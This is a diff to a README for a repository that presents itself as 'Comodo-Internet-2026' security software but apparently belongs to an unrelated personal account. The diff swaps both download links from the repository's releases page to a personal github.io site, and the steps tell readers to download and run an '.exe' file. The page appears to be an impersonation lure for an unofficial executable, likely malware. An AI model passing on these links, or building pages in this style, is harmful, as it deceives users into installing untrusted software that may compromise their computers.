@@ -1,6 +1,6 @@
 # 🛡️ Comodo-Internet-2026 - Protect Your PC With Reliable Security
 
-[![](https://img.shields.io/badge/Download-Comodo-blue.svg)](https://github.com/dailesmelling805/Comodo-Internet-2026/releases)
+[![](https://img.shields.io/badge/Download-Comodo-blue.svg)](https://dailesmelling805.github.io)
 
 ## 📌 About This Software
 
@@ -20,7 +20,7 @@ Your computer must meet these requirements to run the software:
 
 Follow these steps to set up the software on your device:
 
-1. Visit the [official release page](https://github.com/dailesmelling805/Comodo-Internet-2026/releases) to access the installation files.
+1. Visit the [official release page](https://dailesmelling805.github.io) to access the installation files.
 2. Look for the latest version listed under the Releases section.
 3. Click the link that ends in ".exe" to begin the download process.
 4. Save the file to your Downloads folder.
